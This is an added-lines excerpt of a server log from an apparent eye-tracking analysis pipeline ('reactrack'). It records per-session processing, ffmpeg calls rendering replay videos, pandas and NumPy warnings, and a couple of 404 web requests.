+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2458_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2459_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2459_replay.mp4']
+INFO:root:Processing: f9c9f028-2093-4679-97ae-588425adb5b3
+Processing: f9c9f028-2093-4679-97ae-588425adb5b3
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2406_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2406_replay.mp4']
+INFO:werkzeug:209.17.96.98 - - [03/Feb/2020 01:33:03] "GET / HTTP/1.0" 404 -
+209.17.96.98 - - [03/Feb/2020 01:33:03] "GET / HTTP/1.0" 404 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2407_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2407_replay.mp4']
+/home/ubuntu/reactrack/analysis.py:380: RuntimeWarning: Mean of empty slice
+  pupil = pupil - np.nanmean(pupil[stim_idx - 5: stim_idx])
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2408_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2408_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2409_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2409_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2410_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f9c9f028-2093-4679-97ae-588425adb5b3/figures/2410_replay.mp4']
+INFO:root:Processing: 46885034-be85-4025-b207-acd25533bbc6
+Processing: 46885034-be85-4025-b207-acd25533bbc6
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/46885034-be85-4025-b207-acd25533bbc6/figures/227_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/46885034-be85-4025-b207-acd25533bbc6/figures/227_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/46885034-be85-4025-b207-acd25533bbc6/figures/228_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/46885034-be85-4025-b207-acd25533bbc6/figures/228_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/46885034-be85-4025-b207-acd25533bbc6/figures/229_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/46885034-be85-4025-b207-acd25533bbc6/figures/229_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/46885034-be85-4025-b207-acd25533bbc6/figures/230_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/46885034-be85-4025-b207-acd25533bbc6/figures/230_replay.mp4']
+INFO:root:Processing: 09ca8051-fb49-40c4-a59e-4900db65daf2
+Processing: 09ca8051-fb49-40c4-a59e-4900db65daf2
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1723_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1723_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1724_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1724_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1725_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1725_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1726_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1726_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1727_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/09ca8051-fb49-40c4-a59e-4900db65daf2/figures/1727_replay.mp4']
+INFO:root:Processing: bba91743-75bd-40ff-9c87-32f8681d79da
+Processing: bba91743-75bd-40ff-9c87-32f8681d79da
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bba91743-75bd-40ff-9c87-32f8681d79da/figures/763_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bba91743-75bd-40ff-9c87-32f8681d79da/figures/763_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '89.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bba91743-75bd-40ff-9c87-32f8681d79da/figures/764_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '89.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bba91743-75bd-40ff-9c87-32f8681d79da/figures/764_replay.mp4']
+INFO:werkzeug:203.76.196.154 - - [03/Feb/2020 02:03:20] "GET / HTTP/1.1" 404 -
+203.76.196.154 - - [03/Feb/2020 02:03:20] "GET / HTTP/1.1" 404 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bba91743-75bd-40ff-9c87-32f8681d79da/figures/765_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bba91743-75bd-40ff-9c87-32f8681d79da/figures/765_replay.mp4']
+INFO:root:Processing: aa882db6-27bb-4092-b589-c7a9aa9354a2
+Processing: aa882db6-27bb-4092-b589-c7a9aa9354a2
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 475
+visit_exam_id: 475
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 478
+visit_exam_id: 478
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/471_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/471_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/472_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/472_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/473_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/473_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/474_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/474_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/477_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/aa882db6-27bb-4092-b589-c7a9aa9354a2/figures/477_replay.mp4']
+INFO:root:Processing: 9d3ae6a3-180a-4b3e-add7-4e29552f06ea
+Processing: 9d3ae6a3-180a-4b3e-add7-4e29552f06ea
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 484
+visit_exam_id: 484
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 487
+visit_exam_id: 487
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/480_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/480_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/481_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/481_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/482_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/482_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/483_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/483_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/486_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/9d3ae6a3-180a-4b3e-add7-4e29552f06ea/figures/486_replay.mp4']
+INFO:root:Processing: 1bc4d765-a469-4672-9874-d3ce878fa30d
+Processing: 1bc4d765-a469-4672-9874-d3ce878fa30d
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1bc4d765-a469-4672-9874-d3ce878fa30d/figures/851_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1bc4d765-a469-4672-9874-d3ce878fa30d/figures/851_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1bc4d765-a469-4672-9874-d3ce878fa30d/figures/852_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1bc4d765-a469-4672-9874-d3ce878fa30d/figures/852_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1bc4d765-a469-4672-9874-d3ce878fa30d/figures/853_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/1bc4d765-a469-4672-9874-d3ce878fa30d/figures/853_replay.mp4']
+INFO:root:Processing: 3a53a5c0-8bdf-43db-9fe8-8fd8ffacd2fe
+Processing: 3a53a5c0-8bdf-43db-9fe8-8fd8ffacd2fe
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3a53a5c0-8bdf-43db-9fe8-8fd8ffacd2fe/figures/855_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3a53a5c0-8bdf-43db-9fe8-8fd8ffacd2fe/figures/855_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3a53a5c0-8bdf-43db-9fe8-8fd8ffacd2fe/figures/856_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3a53a5c0-8bdf-43db-9fe8-8fd8ffacd2fe/figures/856_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3a53a5c0-8bdf-43db-9fe8-8fd8ffacd2fe/figures/857_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/3a53a5c0-8bdf-43db-9fe8-8fd8ffacd2fe/figures/857_replay.mp4']
+INFO:root:Processing: 5f5df207-198a-436b-bb42-5e3f8c823419
+Processing: 5f5df207-198a-436b-bb42-5e3f8c823419
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+/home/ubuntu/reactrack/matviz/matviz/etl.py:340: RuntimeWarning: divide by zero encountered in true_divide
+  outt = ys/enss
+/home/ubuntu/reactrack/matviz/matviz/etl.py:340: RuntimeWarning: invalid value encountered in true_divide
+  outt = ys/enss
